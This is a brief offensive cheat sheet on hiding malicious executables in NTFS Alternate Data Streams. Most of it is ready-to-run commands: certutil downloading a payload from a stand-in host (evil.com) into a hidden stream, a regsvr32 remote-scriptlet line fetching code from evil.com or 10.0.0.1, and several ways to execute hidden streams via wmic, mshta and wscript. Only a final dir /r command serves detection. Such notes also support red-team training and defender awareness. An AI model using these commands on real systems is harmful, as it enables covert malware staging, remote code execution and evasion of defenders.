# Alternate Data Streams (ADS)

It is possible to hide malicious executables within files by NTFS attributes. There are various ways to do that.

## Hiding

- Basic

    The most simple and basic way to hide files into another file, use `type` command. The `file.txt` must already exist in the system.

    ```powershell
    cmd /c "type .\evil.exe > .\file.txt:evil.exe"
    ```

    To execute the malicious executable, run the command `.\file.txt:evil.exe`.

- Certutil

    The `certutil` command can hide external executables within `file.txt`. The `file.exe` must already exist in the system.

    ```powershell
    certutil -urlcache -split -f https://evil.com/evil.exe .\file.txt:evil.exe
    ```

    To execute the malicious executable, run the command `.\file.txt:evil.exe`.

- Regsvr32

    This command writes code `regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll` to `payload.bat` and hide it within the `file.docx`. The `file.docx` must already exist in the system.

    ```powershell
    cmd /c "echo regsvr32.exe /s /u /i:https://evil.com/evil.exe scrobj.dll > file.docx:evil.bat"
    ```


## Executing

To execute ADS, we can use various methods:

```powershell
.\file.txt:evil.exe
cmd /c start "" "file.docx:payload.bat"
wmic process call create "C:\file.txt:evil.exe"

# for JavaScript
mshta "C:\file.txt:evil.hta"
wscript C:\file.txt:evil.js
```

## Revealing

The command reveals an information of Alternate Data Stream in arbitrary file ('file.txt').

```powershell
cmd /c dir /r .\file.txt
```